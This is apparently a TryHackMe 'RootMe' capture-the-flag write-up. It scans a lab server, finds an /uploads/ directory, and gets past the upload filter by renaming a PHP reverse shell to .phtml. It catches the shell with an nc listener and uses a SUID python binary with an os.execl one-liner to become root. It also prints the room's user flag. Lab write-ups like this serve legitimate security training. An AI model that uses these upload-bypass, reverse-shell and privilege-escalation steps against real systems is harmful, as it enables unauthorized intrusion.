# RootMe — TryHackMe Writeup

## Introduction

This room is about compromising a server using a variety of tools
such as Nmap, Reverse shell, and Privesc.

**Difficulty:** EASY

Some of the concepts covered were new to me, which made this room
a great learning experience.

---



## Task2 - Reconnaissance

We use nmap tool: (use your target machine ip !!! lol)

```bash
└─$ nmap -sC -sV 10.128.184.1                                          
```
This shows us each port and version 

2 open ports. Now, I'll start exploring each possible port, which is port 80 

**What is the hidden directory?**

We use ffuf: ( U can use GobBuster, it's the same )

```bash
└─$ ffuf -u http://10.128.184.1/FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt -mc 200
```

UPP, we have 4 folders, but the suspicious one and that we can exploit is **/uploads/**  — straight to: *http://target_machine_ip/uploads/*

## The key of getting a shell : 

So we can upload a file in, the first idea came to my mind is uploading a php_reverse_shell and get access to the machine: (visit the link -https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php - ---> copy the script ---> change the ip (your ip) and port ----> upload it!)

**Here is the problem the machine doesn't accept a php file, so how can we trick it?? The first thing i did i played with extension( .php.jpg or .pHp instead of .php) and the one it works is .phtml ;
So access it: http://target_machine/uploads/shell.phtml**

Open a new shell and write :

```bash
└─$ nc -lvnp port
```


## Task3 - Getting a shell:

Without wasting time, we search for it:

```bash
$ find / -name user.txt 2>/dev/null
```
The path is: /var/www/user.txt

the flag is: 
     **THM{y0u_g0t_a_sh3ll}**

## Task4 - Privesc:

We search for files with SUID permissions 

```bash
$ find / -perm -u=s -type f 2>/dev/null
```
The weird file is : /usr/bin/python

Visiting -https://gtfobins.org/- and search for python to have a shell:

```bash
/$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Test if we are root !! 

```bash
# whoami
whoami
root
```
**root.txt ??** 

Man i just helped you to get a root shell, find it YOURSELF !! LOL


Hope you find this interesting !



**AND DONE!** 



